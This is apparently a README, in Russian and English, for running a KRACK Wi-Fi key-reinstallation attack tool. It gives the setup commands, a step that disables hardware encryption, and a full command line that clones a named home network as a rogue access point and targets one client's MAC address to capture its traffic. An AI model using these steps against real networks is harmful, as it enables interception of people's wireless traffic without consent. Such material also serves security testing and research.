## Environment tested
This code was tested with the following equipaments:
* Тестер:
  * Ноутбук
  * Kali Linux 2018.4
  * 2 WIFI сетевые карты
  * 1 Ethernet сетевая карта или 4G - модем, или расшара интернета через мобильный интернет USB - Teathering
  
* Жертва (которая подключается к роутеру):
  * Ноутбук или Смартфон или Планшет с WIFI

* Роутер (точка доступа):

## Prerequisites
Установить пакеты Kali Linux:
```
$sudo apt update
$sudo apt install dnsmasq libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python-scapy python-pycryptodome
```
dnsmasq - обязательно установить, иначе интернет не будет работать у жертвы.

Install the following python package:
```
$pip install --user mitm_channel_based
```
Then **disable hardware encryption** using the script ./disable-hwcrypto.sh. It's recommended to reboot after executing this script. After plugging in your Wi-Fi NIC, use systool -vm ath9k_htc or similar to confirm the nohwcript/.. param has been set. 
 
 ## Tool usage
 Below, I show an example of tool command line usage and then explain the arguments:
 
 ```
 $sudo ./krackattack/krack_all_zero_tk.py wlan1 wlan0 usb0 "Familia Couto" -t 00:21:5d:ea:fe:be
 ```
 * `wlan1`: interface that listens and injects packets on the real channel
 * `wlan0`: interface that runs the Rogue AP
 * `usb0`: interface in which is provided internet access
 * `"Familia Couto"`: SSID of the target network
 * `-t 00:21:5d:ea:fe:be`: MAC address of the attacked client
 * You can see many other options running `./krackattack/krack_all_zero_tk.py -h`!
 
 **warnings!**
 * Remember to disable the Wi-Fi before running the script!
 * After disabling the Wi-Fi, run the command: `$rfkill unblock wifi`!
 
 **Files Generated**
 
 After running the script for the first time, some new files will be generated:
 
 * `dnsmasq.conf`: configuration file for DHCP and DNS services
 * `dnsmasq_log`: output from dnsmasq
 * `hostapd_rogue.conf`: configuration file for the rogue ap clone from the real ap
 * `hostapd_rogue.log`: output from hostapd_rogue
 * `rogue_ap_capture.pcap`: file containing packets capture from the rogue ap interface
